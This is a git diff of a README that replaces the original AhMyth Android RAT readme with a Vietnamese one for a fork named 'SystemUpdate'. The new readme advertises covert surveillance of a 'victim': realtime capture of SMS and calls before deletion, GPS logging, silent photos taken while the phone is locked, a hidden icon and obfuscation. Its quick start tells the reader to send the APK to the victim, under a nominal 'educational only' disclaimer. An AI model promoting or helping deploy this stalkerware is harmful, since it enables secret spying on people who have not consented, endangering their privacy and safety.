@@ -1,52 +1,130 @@
-# AhMyth Android Rat
-###### Beta Version
-It consists of two parts :
-* Server side : desktop application based on electron framework (control panel)
-* Client side : android application (backdoor)
+# 🎯 SystemUpdate - Android Remote Administration Tool
 
+[![GitHub](https://img.shields.io/badge/GitHub-dinhkhanhtung-blue)](https://github.com/dinhkhanhtung/SystemUpdate)
+[![Android](https://img.shields.io/badge/Android-4.1%2B-green)](https://developer.android.com)
+[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE.md)
 
-## Getting Started
-### You have two options to install it
-#### 1) From source code
-###### Prerequisite :
-* Electron (to start the app)
-* Java (to generate apk backdoor)
-* Electron-builder and electron-packer (to build binaries for (OSX,WINDOWS,LINUX))
-1. ```git clone https://github.com/AhMyth/AhMyth-Android-RAT.git```
-2. ```cd AhMyth-Android-RAT/AhMyth-Server```
-3. ```npm start```
+**Hệ thống giám sát Android hoàn chỉnh với lưu trữ vĩnh viễn, đồng bộ realtime, và khả năng stealth cao.**
 
-#### 2) From binaries
-###### Prerequisite :
-* Download a binary from https://github.com/AhMyth/AhMyth-Android-RAT/releases
-* Java (to generate apk backdoor)
+---
 
-## Screenshots
-<p align="center">
-  <img src="http://i.imgur.com/HM3uXL6.png" width="600"/>
-</p>
+## ✨ Tính Năng Chính
 
----------------------------------------------------------------
+### 🗄️ **Lưu Trữ Vĩnh Viễn**
+- Tất cả dữ liệu lưu vào JSON database
+- Không mất dữ liệu khi tắt server
+- Xem lịch sử khi victim offline
 
-<p align="center">
-  <img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
-</p>
+### ⚡ **Đồng Bộ Realtime**
+- Phát hiện SMS/Call mới **< 3 giây**
+- Lưu trước khi họ kịp xóa
+- Content Observer tự động theo dõi
 
----------------------------------------------------------------
+### 🔄 **Tự Động Kết Nối Lại**
+- Watchdog kiểm tra mỗi 3 phút
+- Tự động reconnect khi server online
+- Không cần bật máy cả ngày
 
-<p align="center">
-  <img src="http://i.imgur.com/XVXCHV9.png" width="600"/>
-</p>
+### 📸 **Chụp Ảnh Khi Màn Hình Khóa**
+- Tự động mở khóa → Chụp → Khóa lại
+- Tắt flash & sound (stealth)
+- Không để lại dấu vết
 
+### 📊 **Export Dữ Liệu**
+- Excel (.xlsx) - Tất cả dữ liệu
+- Google Maps (.kml) - Lịch sử vị trí
+- Text (.txt) - Tin nhắn
 
-## Video Tutorial
-<p align="center">
-<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
-  <img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
-</a></p>
+### 🔋 **Tối Ưu Pin & Stealth**
+- Bypass battery optimization
+- ProGuard obfuscation
+- Silent notifications
+- Ẩn icon sau khi cấp quyền
 
+---
 
----------------------------------------------------------------
-##### I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.
-###### Twitter : <a href="https://twitter.com/AhMythDev"> @AhMythDev </a>
-###### Bitcoin address for donations:  : 1EVwLuwmbsEuej7qJnNquFeQJLsgd2b8Lq
+## 🚀 Quick Start
+
+### 1. Cài Đặt Server
+
+```bash
+cd AhMyth-Server/app
+npm install
+npm start
+```
+
+### 2. Build APK
+
+```bash
+# Sử dụng APK Builder trong server UI
+# Hoặc chạy script:
+Build_Optimized_APK.bat
+```
+
+### 3. Cài Đặt APK
+
+- Gửi APK cho victim
+- Victim cài đặt và cấp quyền
+- App tự động ẩn và kết nối
+
+---
+
+## 📂 Cấu Trúc Dữ Liệu
+
+```
+AhMyth-Server/app/
+├── data/
+│   └── database.json          # Database JSON
+├── logs/
+│   └── <victim_id>/
+│       ├── locations.log      # Vị trí GPS
+│       ├── messages.log       # Thông báo
+│       ├── realtime_sms.log   # SMS realtime
+│       └── realtime_calls.log # Call realtime
+└── exports/
+    ├── *.xlsx                 # Excel exports
+    ├── *.kml                  # Google Maps
+    └── *.txt                  # Text exports
+```
+
+---
+
+## 📚 Tài Liệu
+
+- **[SETUP_GUIDE.md](SETUP_GUIDE.md)** - Hướng dẫn cài đặt chi tiết
+- **[FEATURES.md](FEATURES.md)** - Chi tiết các tính năng
+
+---
+
+## ⚠️ Lưu Ý Pháp Lý
+
+**Công cụ này chỉ dành cho mục đích giáo dục và nghiên cứu.**
+
+- ❌ KHÔNG sử dụng để xâm phạm quyền riêng tư người khác
+- ❌ KHÔNG sử dụng cho mục đích bất hợp pháp
+- ✅ Chỉ sử dụng trên thiết bị của bạn hoặc có sự đồng ý
+
+**Người dùng chịu trách nhiệm hoàn toàn về việc sử dụng công cụ này.**
+
+---
+
+## 🤝 Đóng Góp
+
+Contributions are welcome! Please feel free to submit a Pull Request.
+
+---
+
+## 📄 License
+
+MIT License - See [LICENSE.md](LICENSE.md) for details
+
+---
+
+## 🔗 Links
+
+- **GitHub:** https://github.com/dinhkhanhtung/SystemUpdate
+- **Original Project:** [AhMyth Android RAT](https://github.com/AhMyth/AhMyth-Android-RAT)
+
+---
+
+**Made with ❤️ by dinhkhanhtung**
